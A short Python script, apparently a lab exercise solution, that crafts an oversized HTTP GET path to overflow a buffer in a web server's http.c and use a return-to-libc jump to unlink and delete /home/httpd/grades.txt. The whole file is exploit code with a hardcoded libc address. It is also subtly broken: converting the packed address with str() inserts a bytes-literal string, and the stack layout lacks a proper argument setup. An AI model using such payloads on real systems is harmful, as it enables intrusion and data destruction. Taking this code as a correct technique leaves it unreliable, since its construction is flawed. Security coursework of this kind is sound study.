import struct


def build_exploit():
    """
    Design an exploit based on the flaw from http.c (line 22).
    The goal is to employ a return-to-libc strategy to remove /home/httpd/grades.txt.
    """

    # Populate the buffer using the identified vulnerability
    crafted_path = "/" + "B" * 1024  # Using "B" instead of "A" just for a change

    # Memory location of 'unlink' in libc, determined using debugging tools
    unlink_function_address = 0xDD450

    # Redirecting the return to the unlink function
    crafted_path += str(struct.pack("<I", unlink_function_address))

    # Target file to be removed using the unlink function
    target_file = "/home/httpd/grades.txt"
    crafted_path += target_file

    http_request = f"GET {crafted_path} HTTP/1.0\r\n\r\n"
    return http_request


print(build_exploit())
